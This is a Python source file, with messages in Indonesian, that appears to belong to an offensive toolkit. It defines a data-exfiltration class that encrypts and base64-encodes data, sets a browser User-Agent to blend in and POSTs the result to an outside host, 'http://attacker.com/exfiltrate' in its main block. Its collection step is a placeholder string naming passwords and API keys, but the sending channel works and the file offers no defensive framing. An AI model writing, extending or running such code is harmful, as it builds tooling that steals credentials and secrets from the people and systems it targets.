import requests
import base64
from cryptography.fernet import Fernet
from . import target_url

class DataExfiltration:
    def __init__(self, exfiltration_url, headers=None):
        self.target_url = target_url
        self.exfiltration_url = exfiltration_url
        self.headers = headers if headers else {'User-Agent': 'Mozilla/5.0'}
        self.key = Fernet.generate_key()
        self.cipher_suite = Fernet(self.key)

    def encrypt_data(self, data):
        encrypted_data = self.cipher_suite.encrypt(data.encode('utf-8'))
        return encrypted_data

    def exfiltrate_data(self, data):
        encrypted_data = self.encrypt_data(data)
        payload = {'data': base64.b64encode(encrypted_data).decode('utf-8')}
        try:
            response = requests.post(self.exfiltration_url, data=payload, headers=self.headers)
            if response.status_code == 200:
                print("Data berhasil diekstraksi!")
            else:
                print(f"Gagal mengekstraksi data. Kode status: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Terjadi kesalahan saat ekstraksi data: {e}")

    def retrieve_sensitive_data(self):
        try:
            sensitive_data = "Informasi sensitif seperti password, API keys, dll."
            print(f"Data sensitif yang diambil: {sensitive_data}")
            return sensitive_data
        except Exception as e:
            print(f"Kesalahan saat mengambil data sensitif: {e}")
            return None

    def exfiltrate_sensitive_data(self):
        sensitive_data = self.retrieve_sensitive_data()
        if sensitive_data:
            self.exfiltrate_data(sensitive_data)

if __name__ == "__main__":
    exfiltration_url = "http://attacker.com/exfiltrate"
    data_exfiltration = DataExfiltration(exfiltration_url)
    data_exfiltration.exfiltrate_sensitive_data()
